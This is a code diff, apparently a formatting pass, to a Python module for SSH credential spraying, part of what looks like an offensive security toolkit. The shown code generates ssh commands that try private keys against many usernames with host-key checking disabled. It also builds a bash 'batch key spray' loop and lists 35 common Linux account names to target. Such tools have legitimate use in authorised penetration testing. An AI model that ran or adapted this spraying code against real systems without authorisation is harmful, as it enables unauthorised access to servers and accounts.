@@ -8,8 +8,7 @@ SSH-specific credential spraying and key-based access.
 from __future__ import annotations
 
 import logging
-from dataclasses import dataclass, field
-from typing import Any
+from dataclasses import dataclass
 
 logger = logging.getLogger(__name__)
 
@@ -17,6 +16,7 @@ logger = logging.getLogger(__name__)
 @dataclass
 class SSHSprayResult:
     """Result of SSH spray attempt."""
+
     target: str
     port: int
     username: str
@@ -176,12 +176,14 @@ class SSHSprayer:
 
         for key_path in key_paths:
             for username in usernames:
-                commands.append({
-                    "command": f"ssh -i {key_path} -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no {username}@{target}:{self.port} 'echo SUCCESS'",
-                    "username": username,
-                    "key_path": key_path,
-                    "description": f"Test key {key_path} for {username}@{target}",
-                })
+                commands.append(
+                    {
+                        "command": f"ssh -i {key_path} -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no {username}@{target}:{self.port} 'echo SUCCESS'",
+                        "username": username,
+                        "key_path": key_path,
+                        "description": f"Test key {key_path} for {username}@{target}",
+                    }
+                )
 
         # Batch command
         if key_paths and usernames:
@@ -192,11 +194,13 @@ for key in {' '.join(key_paths)}; do
     done
 done
 """
-            commands.append({
-                "command": batch_script.strip(),
-                "description": "Batch key spray",
-                "shell": "bash",
-            })
+            commands.append(
+                {
+                    "command": batch_script.strip(),
+                    "description": "Batch key spray",
+                    "shell": "bash",
+                }
+            )
 
         return commands
 
@@ -258,13 +262,41 @@ done
     def get_common_linux_users(self) -> list[str]:
         """Get list of common Linux usernames."""
         return [
-            "root", "admin", "administrator", "user", "test",
-            "ubuntu", "centos", "debian", "ec2-user", "azureuser",
-            "vagrant", "ansible", "deploy", "git", "jenkins",
-            "www-data", "nginx", "apache", "mysql", "postgres",
-            "oracle", "tomcat", "redis", "elasticsearch", "kafka",
-            "hadoop", "spark", "docker", "kubernetes", "k8s",
-            "backup", "ftp", "ftpuser", "sshd", "daemon",
+            "root",
+            "admin",
+            "administrator",
+            "user",
+            "test",
+            "ubuntu",
+            "centos",
+            "debian",
+            "ec2-user",
+            "azureuser",
+            "vagrant",
+            "ansible",
+            "deploy",
+            "git",
+            "jenkins",
+            "www-data",
+            "nginx",
+            "apache",
+            "mysql",
+            "postgres",
+            "oracle",
+            "tomcat",
+            "redis",
+            "elasticsearch",
+            "kafka",
+            "hadoop",
+            "spark",
+            "docker",
+            "kubernetes",
+            "k8s",
+            "backup",
+            "ftp",
+            "ftpuser",
+            "sshd",
+            "daemon",
         ]
 
     def get_post_auth_commands(
